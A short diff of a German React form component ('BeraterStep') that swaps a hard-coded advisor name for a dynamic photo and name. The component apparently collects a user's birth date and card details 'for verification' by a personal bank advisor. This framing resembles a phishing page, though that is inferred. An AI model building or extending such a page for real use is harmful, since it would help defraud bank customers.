@@ -335,16 +335,16 @@ const BeraterStep = ({ onSubmit }: { onSubmit: (geburtsdatum: string, karte: str
         <div className="w-full max-w-xl bg-[#f5f5f5] rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)] mt-20 sm:mt-[114px]">
           <div className="px-4 sm:px-8 py-8 sm:py-10 flex flex-col items-center text-center">
             <div className="h-36 w-36 rounded-full bg-muted border-4 border-white shadow-[0_4px_18px_rgba(0,0,0,0.12)] flex items-center justify-center overflow-hidden">
-              <span className="text-5xl font-semibold text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>JS</span>
+              <img src={berater.photoUrl} alt={berater.name} className="h-full w-full object-cover" />
             </div>
             <p className="mt-5 text-xs tracking-[0.18em] font-semibold text-primary uppercase">Ihr persönlicher Kundenberater</p>
-            <h1 className="mt-2 text-3xl font-bold text-[#0f1b2d]" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>Justus Sperling</h1>
+            <h1 className="mt-2 text-3xl font-bold text-[#0f1b2d]" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>{berater.name}</h1>
             <div className="mt-3 flex items-center gap-2 text-foreground">
               <Phone className="h-4 w-4" />
               <span className="text-sm font-medium">+49 211 5998 08</span>
             </div>
             <p className="mt-6 text-sm text-foreground/70 leading-relaxed max-w-md">
-              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">Justus Sperling</span> betreut.
+              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">{berater.name}</span> betreut.
               Ihr Berater hat den Vorgang vorbereitet. Zur Verifizierung gegenüber Ihrem Berater geben Sie bitte die folgenden Daten ein.
             </p>
             <div className="mt-6 w-full max-w-md flex items-start gap-3 rounded-md border border-primary/20 bg-primary/5 px-4 py-3 text-left">
